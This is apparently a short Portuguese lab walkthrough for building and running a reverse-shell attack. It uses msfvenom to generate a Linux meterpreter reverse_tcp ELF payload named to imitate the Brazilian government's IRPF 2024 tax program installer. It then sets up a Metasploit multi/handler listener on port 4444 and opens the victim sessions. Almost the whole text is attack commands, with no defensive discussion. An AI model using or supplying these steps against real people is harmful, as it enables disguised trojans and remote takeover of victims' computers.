# Execução do Ataque

## 1. Sistema Atacante

Criar o container do atacante.

```bash
$ docker build -t attacker .
```

Iniciar o container do atacante.

```bash
$ docker run --rm -it -v $(pwd):/hack attacker bash
```

## 2. Criar o Payload Malicioso

Anotar o IP do container.

```bash
ifconfig
```

Criar o arquivo malicioso que contém o código que possibilita a conexão reversa.

```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=4444 -f elf --smallest > <FILE_NAME>.elf

$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.17.0.2 LPORT=4444 -f elf --smallest > IRPF2024Linux-x86_64v1.5.sh.elf
```
<!-- windows/meterpreter/reverse_tcp -->
<!-- original do governo: IRPF2024Linux-x86_64v1.5.sh.b -->

## 3. Preparação para Captura

Iniciar o MSF Console (interface para o Metasploit Framework) e definir as configurações para interceptar a conexão reversa.

```bash
$ msfconsole

$ use exploit/multi/handler

$ set payload linux/x64/meterpreter/reverse_tcp

$ set LHOST <IP_ATACANTE>
$ set LHOST 172.17.0.2

$ set LPORT 4444
```

Iniciar a escuta da porta definida

```bash
$ exploit -j 
```

E 

## 4. Atacar a Vítima

Uma vez conectado, pesquisar as sessões abertas e acessar a de interesse a partir do ID listado. 

```bash
$ sessions -l

$ sessions -i <Session_ID>
$ sessions -i 1
```
